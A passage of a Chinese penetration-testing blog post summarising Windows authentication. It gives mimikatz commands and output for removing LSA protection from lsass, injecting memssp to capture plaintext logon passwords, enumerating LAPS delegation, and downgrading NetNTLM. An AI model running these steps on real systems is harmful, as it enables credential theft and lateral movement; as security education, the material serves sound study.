+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7f9zvgmt4j315008yt9s.jpg" alt="1536303605988.png"></p>
+<p>使用lsadump::lsa /inject:</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7fa0bgp08j314i0d2410.jpg" alt="1536303619882.png"></p>
+<p>同样无法获取到密码hash</p>
+<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>mimikatz能够通过加载其驱动程序来绕过LSA Protection。在实际使用中需要注意mimikatz同目录下需要有驱动程序mimidrv.sys<br>命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::Debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7fa1kvkmlj30it0aujre.jpg" alt="截图_2019-09-28_15-44-50.png"></p>
+<h4 id="Microsoft本地管理员密码解决方案（LAPS）"><a href="#Microsoft本地管理员密码解决方案（LAPS）" class="headerlink" title="Microsoft本地管理员密码解决方案（LAPS）"></a>Microsoft本地管理员密码解决方案（LAPS）</h4><p>LAPS是用于管理计算机本地用户密码的一个客户端扩展（CSE），在域中依赖比较少，核心在于组策略支持。<br>LAPS一个重要功能是随机化所有域成员本地管理员密码，密码按照较强的密码策略生成，定期修改。这使得用相同凭据横向渗透变得很困难。</p>
+<p>本地管理员密码明文存储在AD中，仅有管理员及获得管理员委派的账户能访问到。</p>
+<h4 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>工具：<a href="https://github.com/leoloobeek/LAPSToolkit" target="_blank" rel="noopener">https://github.com/leoloobeek/LAPSToolkit</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop\LAPSToolkit&gt; powershell -exec bypass <span class="string">"import-module .\LAPSToolkit.ps1;Find-LAPSDelegat</span></span><br><span class="line"><span class="string">edGroups"</span></span><br></pre></td></tr></table></figure>
+<h4 id="Credentials-Guard"><a href="#Credentials-Guard" class="headerlink" title="Credentials Guard"></a>Credentials Guard</h4><p>Credentials Guard是win10中引入的新功能，据称能保护NTLM密码哈希值，Kerberos票证授予票证和应用程序存储的凭据。该进程是唯一能使用明文凭据的进程，它的原理大概是这样：<br>当NTLM认证过程中需要用到例如ntlm hash这类凭证的时候（第三步），将Credentials Guard视为黑箱，由lsass等进程输入生成NetNTLM所需的信息（第二步收到的challenge等等），由CG处理并输出结果，而CG本身内存禁止读取，使得mimikatz这一类工具无从下手：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7fas0hhl7j30vy0nq412.jpg" alt="1533630135491.png"></p>
+<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>memssp<br>SSP的二进制形式是DLL，提供用来处理身份认证的接口（SSPI）。如果我们无法从内存中直接获取凭据，那么通过注册一个ssp来处理用户登录时输入的凭据也是一种办法。mimikatz直接在内存中加载自定义的ssp dll，能够在用户登录时获取到明文凭据。</p>
+<p>mimikatz 内存注入ssp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop\x64&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #17763 Apr  4 2019 23:56:50</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&apos;Amour&quot; - (oe.eo) ** Cam Edition **</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &apos;## v ##&apos;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &apos;#####&apos;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &apos;20&apos; OK</span><br><span class="line"></span><br><span class="line">mimikatz # misc::memssp</span><br><span class="line">Injected =)</span><br><span class="line"></span><br><span class="line">mimikatz # exit</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>
+<p>锁屏等待用户再次登录后，查看system32下的文件</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7fblrt0iuj30kw051747.jpg" alt="截图_2019-09-28_16-38-52.png"></p>
+<p>即可获得明文密码</p>
+<h4 id="NetNTLM-Downgrade-Attack"><a href="#NetNTLM-Downgrade-Attack" class="headerlink" title="NetNTLM Downgrade Attack"></a>NetNTLM Downgrade Attack</h4><p>NetNTLM有两个版本——v1和v2。v1相比v2更加脆弱，因此如果我们能将NetNTLMv2降级为v1，破解的效率会更高；如果能降级到NetLM，那么爆破成功率就变得极高。</p>
+<p>在这篇文章中提到了一种迂回获取凭据的方式，核心思想是修改注册表使Windows允许在网络认证中发送算法较弱的NetHash例如NetNTLMv1，而实际上我们可以直接与NTLM SSP交互而不必产生网络流量，并能获取到NetNTLMv1用于降低破解的难度</p>
+<p>工具地址：</p>
+<p><a href="https://github.com/eladshamir/Internal-Monologue" target="_blank" rel="noopener">https://github.com/eladshamir/Internal-Monologue</a></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7fbeoilp1j30r504j3ye.jpg" alt="截图_2019-09-28_16-32-00.png"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/winlo/">windows认证总结</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年02月04日 - 13:02</p>
+  <p><span>最后更新:</span>2020年02月04日 - 13:02</p>
+  <p><span>原始链接:</span><a href="/winlo/" title="windows认证总结">https://lengjibo.github.io/winlo/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/winlo/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/logon/" rel="next" title="伪造Windows登录窃取密码">
+                <i class="fa fa-chevron-left"></i> 伪造Windows登录窃取密码
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/nmapnse/" rel="prev" title="nmap插件编写">
+                nmap插件编写 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table Des Matières
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Ensemble
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">78</span>
+                    <span class="site-state-item-name">articles</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">107</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#windows本地认证"><span class="nav-number">1.</span> <span class="nav-text">windows本地认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#本地认证基础知识"><span class="nav-number">1.1.</span> <span class="nav-text">本地认证基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-Hash与NTLM"><span class="nav-number">1.2.</span> <span class="nav-text">NTLM Hash与NTLM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-Hash的产生"><span class="nav-number">1.3.</span> <span class="nav-text">NTLM Hash的产生</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#本地认证流程"><span class="nav-number">1.4.</span> <span class="nav-text">本地认证流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LM-Hash"><span class="nav-number">1.5.</span> <span class="nav-text">LM Hash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络认证"><span class="nav-number">2.</span> <span class="nav-text">网络认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LAN-Manager-Challenge-Response"><span class="nav-number">2.1.</span> <span class="nav-text">LAN Manager Challenge/Response</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-协议"><span class="nav-number">2.2.</span> <span class="nav-text">NTLM 协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pass-The-Hash（哈希传递攻击）"><span class="nav-number">2.3.</span> <span class="nav-text">Pass The Hash（哈希传递攻击）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pass-The-Hash-缓解"><span class="nav-number">2.4.</span> <span class="nav-text">Pass The Hash 缓解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#kb2871997"><span class="nav-number">2.4.1.</span> <span class="nav-text">kb2871997</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过方法："><span class="nav-number">2.4.2.</span> <span class="nav-text">绕过方法：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#添加“受限管理员模式”"><span class="nav-number">2.4.3.</span> <span class="nav-text">添加“受限管理员模式”</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过"><span class="nav-number">2.4.4.</span> <span class="nav-text">绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Protected-Users"><span class="nav-number">2.4.5.</span> <span class="nav-text">Protected Users</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Additional-LSA-Protection"><span class="nav-number">2.4.6.</span> <span class="nav-text">Additional LSA Protection</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过方法"><span class="nav-number">2.4.7.</span> <span class="nav-text">绕过方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Microsoft本地管理员密码解决方案（LAPS）"><span class="nav-number">2.4.8.</span> <span class="nav-text">Microsoft本地管理员密码解决方案（LAPS）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过方法-1"><span class="nav-number">2.4.9.</span> <span class="nav-text">绕过方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Credentials-Guard"><span class="nav-number">2.4.10.</span> <span class="nav-text">Credentials Guard</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过方式"><span class="nav-number">2.4.11.</span> <span class="nav-text">绕过方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NetNTLM-Downgrade-Attack"><span class="nav-number">2.4.12.</span> <span class="nav-text">NetNTLM Downgrade Attack</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Thème – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
